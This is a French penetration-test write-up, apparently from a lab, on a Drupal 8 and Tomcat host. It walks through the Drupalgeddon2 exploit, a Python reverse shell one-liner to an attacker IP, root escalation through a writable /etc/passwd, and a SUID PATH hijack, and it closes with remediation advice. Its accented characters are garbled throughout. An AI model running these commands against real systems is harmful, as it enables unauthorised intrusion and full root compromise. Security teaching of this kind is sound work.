# **Rapport de Test d'Intrusion sur la machine 192.168.74.145**

## **1. Introduction**

Ce rapport documente un test dâ€™intrusion menÃ© sur la machine **192.168.74.145**, dÃ©couverte sur le rÃ©seau via un scan Nmap. Lâ€™objectif de ce test est de :

- **Effectuer une reconnaissance approfondie** pour identifier les services exposÃ©s et leurs vulnÃ©rabilitÃ©s.
- **Exploiter des failles connues**, notamment sur **Drupal 8** et **Apache Tomcat**.
- **Obtenir un accÃ¨s initial** sur le serveur.
- **Ã‰lever les privilÃ¨ges** pour obtenir un shell root et un contrÃ´le total de la machine.

---

## **2. Reconnaissance et Scan Initial**

### **2.1 DÃ©tection de la machine**

L'adresse IP de la cible a Ã©tÃ© identifiÃ©e Ã  l'aide de la commande suivante :

```bash
nmap -sN 192.168.74.0/24
```

**RÃ©sultat :** La machine cible a Ã©tÃ© dÃ©tectÃ©e Ã  **192.168.74.145**.

### **2.2 Scan complet des services actifs**

Un scan **Nmap approfondi** a Ã©tÃ© rÃ©alisÃ© avec les scripts par dÃ©faut et la dÃ©tection des versions des services :

```bash
nmap -sSCV -p- 192.168.74.145
```

### **2.3 RÃ©sultats du scan Nmap**

|**Port**|**Ã‰tat**|**Service**|**Version**|
|---|---|---|---|
|22/tcp|open|SSH|OpenSSH 6.6.1p1 (Ubuntu 2ubuntu2.8)|
|80/tcp|open|HTTP|Apache 2.4.7 (Ubuntu)|
|111/tcp|open|RPCBind|Version 2-4 (RPC #100000)|
|8080/tcp|open|HTTP|Apache Tomcat/Coyote JSP engine 1.1|

Le scan a rÃ©vÃ©lÃ© plusieurs services critiques :

- **Un serveur Apache avec Drupal 8 sur le port 80**
- **Un serveur Apache Tomcat sur le port 8080**, avec les mÃ©thodes HTTP **PUT et DELETE activÃ©es**
- **Un service SSH (OpenSSH 6.6.1p1)**, qui peut Ãªtre utilisÃ© pour maintenir un accÃ¨s persistant
- **Un service RPC Bind (port 111)**, potentiellement exploitable

---

## **3. Exploitation de Drupal 8 - CVE-2018-7600 ("Drupalgeddon2")**

### **3.1 Identification de la vulnÃ©rabilitÃ©**

Lâ€™empreinte de la machine a rÃ©vÃ©lÃ© quâ€™elle tourne sous **Drupal 8**, ce qui a conduit Ã  une recherche de vulnÃ©rabilitÃ©s connues.  
Jâ€™ai trouvÃ© sur **Exploit-DB** un exploit en Ruby pour **CVE-2018-7600**, permettant une exÃ©cution de code Ã  distance (RCE).

### **3.2 Exploitation avec Drupalgeddon2**

Jâ€™ai copiÃ© le code et lâ€™ai enregistrÃ© dans un fichier `drupal.rb`.

ExÃ©cution de lâ€™exploit :

```ruby
ruby drupal.rb http://192.168.74.145/
```

**RÃ©sultat :**

- Connexion rÃ©ussie Ã  la machine cible avec les **droits www-data**.
- Lâ€™accÃ¨s est restreint, mais permet dâ€™exÃ©cuter des commandes Ã  distance.

---

## **4. Obtention dâ€™un Shell InversÃ© (Reverse Shell)**

### **4.1 Ouverture dâ€™un listener sur lâ€™attaquant**

```bash
nc -nlvp 9999
```

### **4.2 ExÃ©cution du Reverse Shell Python sur la cible**

Pour amÃ©liorer lâ€™interaction avec la machine cible, jâ€™ai exÃ©cutÃ© un **reverse shell en Python** :

```bash
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.74.135",9999));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

### **4.3 AmÃ©lioration du shell**

Une fois connectÃ©, jâ€™ai stabilisÃ© le shell en exÃ©cutant :

```bash
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

Cela permet dâ€™avoir un terminal plus stable et de pouvoir utiliser les commandes comme `clear`.

---

## **5. Ã‰lÃ©vation de PrivilÃ¨ges**

### **5.1 Analyse avec LinEnum**

Pour identifier des failles locales, jâ€™ai tÃ©lÃ©chargÃ© et exÃ©cutÃ© **LinEnum.sh** :

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
bash LinEnum.sh
```

**Pourquoi dans `/tmp/` ?**

- Ce dossier est **temporaire**, ce qui signifie que les fichiers sont supprimÃ©s aprÃ¨s un redÃ©marrage.
- Les **autres utilisateurs** du systÃ¨me ne remarqueront pas sa prÃ©sence.

### **5.2 RÃ©sultats de LinEnum**

- **Permissions incorrectes sur `/etc/passwd`**.
- PrÃ©sence dâ€™un **utilisateur indishell** avec un **mot de passe hashÃ©** :

```bash
indishell:$6$AunCdsxZ$OBxuMf0a/GqstthT4LEW8RGZxepGL7C3jHMk/IFyhLCTJ/.0fo/9Aa.s134i80zAr1HtdyICiogwDAXzG0NWZ0
```

### **5.3 Identification du hash**

Le hash a Ã©tÃ© identifiÃ© via **hashes.com** comme Ã©tant **SHA512crypt (Unix) - Format $6$**.

### **5.4 Contournement de l'authentification root**

MÃ©thode 1 - **Remplacement du hash root**

GÃ©nÃ©ration dâ€™un hash SHA512 pour un nouveau mot de passe :

```python
import crypt
hashed = crypt.crypt("mypassword", crypt.mksalt(crypt.METHOD_SHA512))
print(hashed)
```

Ensuite, **remplacement du hash root** dans `/etc/passwd` et connexion en SSH avec le nouveau mot de passe.

---

## **6. Alternative dâ€™Ã©lÃ©vation via un binaire SUID**

### **6.1 Recherche de fichiers SUID**

```bash
find / -perm -4000 2> /dev/null
```

**RÃ©sultat :**

```
/opt/s
/sbin/mount.nfs
/sudo
/passwd
/su
```

### **6.2 Exploitation de `/opt/s`**

Ce binaire exÃ©cute **scp** pour copier des fichiers systÃ¨me.

En modifiant le **PATH** pour utiliser une version malveillante de `scp` :

```bash
echo "/bin/bash" > /tmp/scp
chmod +x /tmp/scp
export PATH=/tmp:$PATH
/opt/s
```

Cela exÃ©cute un **shell root**.

---

## **7. Conclusion et Recommandations**

GrÃ¢ce Ã  lâ€™exploitation de **Drupalgeddon2**, nous avons pu obtenir un accÃ¨s initial en tant que **www-data**. Ensuite, nous avons escaladÃ© nos privilÃ¨ges grÃ¢ce :

- **Au remplacement du hash root** via un accÃ¨s en Ã©criture Ã  `/etc/passwd`.
- **Ã€ lâ€™exploitation dâ€™un binaire SUID** (`/opt/s`).

### **VulnÃ©rabilitÃ©s exploitÃ©es :**

âœ… **CVE-2018-7600 (Drupalgeddon2) :** ExÃ©cution de code Ã  distance sur Drupal 8.  
âœ… **Reverse Shell Python :** Connexion interactive avec la machine cible.  
âœ… **Permissions incorrectes sur `/etc/passwd` :** Remplacement du mot de passe root.  
âœ… **Binaire SUID mal configurÃ© :** ExÃ©cution dâ€™un shell root via `/opt/s`.

### **Recommandations de SÃ©curitÃ© :**

ğŸ”’ **Mettre Ã  jour Drupal 8 pour corriger CVE-2018-7600.**  
ğŸ”’ **Restreindre les permissions sur `/etc/passwd`.**  
ğŸ”’ **DÃ©sactiver ou sÃ©curiser les fichiers SUID comme `/opt/s`.**  
ğŸ”’ **Restreindre les mÃ©thodes HTTP PUT et DELETE sur Tomcat.**

**Ce test dÃ©montre lâ€™importance de maintenir un systÃ¨me sÃ©curisÃ© pour Ã©viter une compromission totale.** ğŸš€